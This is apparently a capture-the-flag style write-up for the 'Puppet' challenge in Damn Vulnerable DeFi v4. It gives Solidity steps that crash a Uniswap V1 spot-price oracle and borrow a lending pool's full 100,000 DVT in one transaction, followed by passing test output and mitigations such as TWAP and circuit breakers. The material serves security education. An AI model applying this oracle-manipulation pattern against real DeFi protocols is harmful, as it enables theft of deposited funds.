# Puppet Challenge Solution

A security study and step-by-step exploit of the “Puppet” price-oracle vulnerability in Damn Vulnerable DeFi v4.  
Demonstrates how on-chain spot pricing without time-weighting can be manipulated in a single transaction to drain a lending pool.


## Background

This challenge features a lending pool requiring 2× ETH collateral per DVT borrowed.  
The pool uses a Uniswap V1 exchange as its price oracle, pulling the current spot price from the pool’s 10 ETH / 10 DVT liquidity.  
An attacker starting with 25 ETH and 1 000 DVT can crash the price and borrow the entire 100 000 DVT in one transaction.

---

## Challenge Setup

- **Lending Pool**:  
  - Holds 100 000 DVT  
  - Collateral formula: `2 × amount × spotPrice`  

- **Uniswap V1 Pool**:  
  - 10 ETH and 10 DVT  
  - Spot price = `getTokenToEthInputPrice`  

- **Attacker Wallet**:  
  - 25 ETH  
  - 1 000 DVT  

---

## Exploit Walkthrough

1. **Approve DVT**  
   The attacker approves the Uniswap V1 exchange to pull all 1 000 DVT.

2. **Dump DVT → ETH**  
   ```solidity
   uint256 tokens = token.balanceOf(player);
   token.approve(address(dex), tokens);
   dex.tokenToEthSwapInput(tokens, 1, block.timestamp);


This sale skews the pool ratio and crashes the spot price.

3. **Calculate Collateral**
```solidity
uint256 poolTokens = token.balanceOf(address(pool));
uint256 requiredEth = pool.calculateDepositRequired(poolTokens);
```
Collateral requirement becomes negligible.

4. **Borrow All DVT**
```solidity
pool.borrow{value: requiredEth}(poolTokens, recovery);
```
The entire 100 000 DVT is transferred to the recovery address, the attack is successful.

## Mitigation Strategies

- **Time-Weighted Average Price (TWAP)**
  - Integrate Uniswap V2/V3 TWAP over a 30-minute window.
  - In practice, dumping 1 000 DVT into a 10 ETH/10 DVT pool moves spot price by ≈ 90 %, but a 30-minute TWAP only shifts by ≈ 3 %.
  - Implementable via on-chain contracts or Chainlink TWAP adapters.

- **Multi-Source Price Aggregation**
  - Combine spot prices from multiple DEXs (Uniswap, SushiSwap) and a centralized oracle (Chainlink).
  - Use a medianizer contract to reject outliers, forcing an attacker to manipulate ≥ 3 venues simultaneously.

- **Borrow Caps & Rate Limits**
  - Enforce a per-transaction cap (e.g., max 1 000 DVT/tx) and a per-block cap (e.g., max 5 000 DVT/block).
  - In this setup, a 1 000 DVT cap would block a full drain, buying time for manual intervention and alerting.

- **Circuit Breakers on Volatility**
  - Pause borrowing when price moves exceed a 10 % threshold within a 1-minute interval.
  - Integrate on-chain monitoring to automatically halt lending if abrupt swings occur.

All these recommendations are practical to implement in existing DeFi protocols and critically reduce the attack surface for flash-loan and price-manipulation attacks.

## Conclusion

Working through the Puppet challenge reinforced a simple truth: any on-chain oracle that relies solely on spot rates and low liquidity can be weaponized. By building and running this exploit myself, I gained hands-on insight into:

- Crafting single-transaction attacks against spot-based oracles
- The importance of smoothing and multi-source aggregation in price feeds
- Designing operational guardrails (caps, circuit breakers) that balance security with liquidity

This case study serves as both a cautionary tale and a blueprint for hardening production DeFi systems against flash manipulation risks.

## Hasil Test (CLI Output)

```bash
[⠒] Compiling...
[⠰] Compiling 1 files with Solc 0.8.25
[⠔] Solc 0.8.25 finished in 1.26s
Compiler run successful!

Ran 2 tests for test/puppet/Puppet.t.sol:PuppetChallenge
[PASS] test_assertInitialState() (gas: 49224)
[PASS] test_puppet() (gas: 159910)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 2.95ms (375.20µs CPU time)

Ran 1 test suite in 16.13ms (2.95ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)







